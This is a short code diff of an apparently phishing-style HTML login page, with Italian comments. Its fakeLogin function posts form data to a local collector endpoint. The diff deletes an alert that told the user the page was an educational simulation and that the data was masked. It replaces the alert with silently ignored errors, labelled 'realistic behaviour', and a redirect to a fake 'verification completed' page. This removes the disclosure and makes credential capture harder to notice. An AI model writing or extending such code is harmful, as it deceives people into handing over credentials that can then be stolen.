@@ -82,25 +82,25 @@ function fakeLogin() {
     timestamp: new Date().toISOString()
   };
 
+  /* ===== POST REALE ===== */
   fetch("http://localhost:3000/collect", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
     body: JSON.stringify(payload)
+  }).catch(() => {
+    // eventuale errore ignorato (comportamento realistico)
   });
 
-  alert(
-    "SIMULAZIONE DIDATTICA\n\n" +
-    "I dati sono stati inviati via email in forma MASCHERATA."
-  );
+  /* ===== REDIRECT COME PRIMA ===== */
+  setTimeout(() => {
+    window.location.href = "verifica-completata.html";
+  }, 700);
 
   return false;
 }
 </script>
-
-
-
 
 </body>
 </html>
